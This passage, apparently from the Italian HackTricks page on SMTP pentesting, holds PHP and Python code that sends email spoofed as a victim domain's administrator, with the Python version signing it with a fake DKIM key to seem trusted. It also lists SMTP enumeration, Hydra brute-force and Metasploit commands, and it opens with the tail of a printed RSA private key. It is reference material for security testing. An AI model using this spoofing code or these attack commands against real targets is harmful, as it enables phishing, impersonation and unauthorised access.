koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```
{% endhint %}

**Oppure puoi farlo manualmente:**

{% tabs %}
{% tab title="PHP" %}
<pre class="language-php"><code class="lang-php"><strong># Questo invier√† un messaggio non firmato
</strong><strong>mail("tua_email@gmail.com", "Oggetto di prova!", "Ciao! Questo √® un test", "Da: amministratore@vittima.com");
</strong></code></pre>
{% endtab %}

{% tab title="Python" %}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{% endtab %}
{% endtabs %}

### **Ulteriori informazioni**

**Trova ulteriori informazioni su queste protezioni in** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **Altri indicatori di phishing**

* Et√† del dominio
* Link che puntano a indirizzi IP
* Tecniche di manipolazione dei link
* Allegati sospetti (non comuni)
* Contenuto dell'email danneggiato
* Valori utilizzati diversi da quelli degli header della mail
* Esistenza di un certificato SSL valido e affidabile
* Invio della pagina a siti di filtraggio dei contenuti web

## Esfiltrazione tramite SMTP

**Se puoi inviare dati tramite SMTP** [**leggi questo**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**.**

## File di configurazione

### Postfix

Di solito, se installato, in `/etc/postfix/master.cf` contiene **script da eseguire** quando ad esempio una nuova email viene ricevuta da un utente. Ad esempio, la riga `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` significa che `/etc/postfix/filtering` verr√† eseguito se una nuova email viene ricevuta dall'utente mark.

Altri file di configurazione:
```
sendmail.cf
submit.cf
```
## Riferimenti
* [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
* [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)

## Comandi Automatici HackTricks
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Configurazione immediatamente disponibile per la valutazione delle vulnerabilit√† e il penetration testing**. Esegui un pentest completo da qualsiasi luogo con oltre 20 strumenti e funzionalit√† che vanno dalla ricognizione alla generazione di report. Non sostituiamo i pentester, sviluppiamo invece strumenti personalizzati, moduli di rilevamento ed exploit per permettere loro di dedicarsi a scavare pi√π a fondo, ottenere accesso ai sistemi e divertirsi.

{% embed url="https://pentest-tools.com/" %}
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository GitHub di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
